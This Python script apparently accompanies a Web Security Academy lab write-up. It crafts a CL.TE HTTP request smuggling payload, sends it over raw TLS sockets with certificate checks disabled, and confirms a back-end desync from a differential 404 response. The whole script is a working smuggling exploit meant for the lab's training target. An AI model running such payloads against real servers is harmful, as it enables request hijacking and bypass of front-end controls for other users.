#!/usr/bin/env python3
"""
HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 01-confirming-cl-te-differential-responses.md

What this does:
    Sends a CL.TE smuggling payload over a raw TLS keep-alive connection: the
    outer Content-Length covers the whole body, but the smuggled prefix is
    terminated with a chunked "0" so the back-end's Transfer-Encoding parser
    stops early and leaves "GET /404check HTTP/1.1" sitting in its buffer.
    A normal follow-up "GET /" on the same connection then merges onto that
    leftover data -- if the back-end really did treat it as a separate
    request, the response to our follow-up comes back 404 instead of 200.

    Standard HTTP libraries (httpx, requests) normalize/recompute headers
    like Content-Length and would silently "fix" this payload, so this uses
    raw sockets over TLS exactly like the original solve.

Usage:
    python 01-confirming-cl-te-differential-responses.py <lab-url>
    e.g. python 01-confirming-cl-te-differential-responses.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    (stdlib only -- socket, ssl)
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    """Raw TLS socket forced to HTTP/1.1 ALPN -- a normal HTTP client would
    reject or auto-correct the ambiguous Content-Length/Transfer-Encoding
    pairing this attack depends on."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 1.0) -> list[bytes]:
    """Send multiple payloads on a single keep-alive connection, return each response."""
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_clte_payload(host: str, smuggled_request: str, path: str = "/") -> bytes:
    """CL.TE payload: front-end trusts Content-Length (covers everything),
    back-end trusts Transfer-Encoding (stops at the chunked '0' terminator)."""
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    smuggled = "GET /404check HTTP/1.1\r\nFoo: x"
    attack = build_clte_payload(host, smuggled)
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    for attempt in range(1, 4):
        responses = send_raw_keep_alive(host, [attack, normal])
        r2 = responses[-1] if responses else b""
        status_line = r2.split(b"\r\n", 1)[0].decode(errors="replace") if r2 else "(no response)"
        print(f"[*] Attempt {attempt}: follow-up response -- {status_line}")
        if b"404" in r2:
            print("[+] Differential 404 confirmed -- the back-end parsed our smuggled")
            print("    GET /404check as a real request and merged it with the follow-up.")
            break
    else:
        print("[-] No 404 observed after 3 attempts -- CL.TE desync not confirmed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
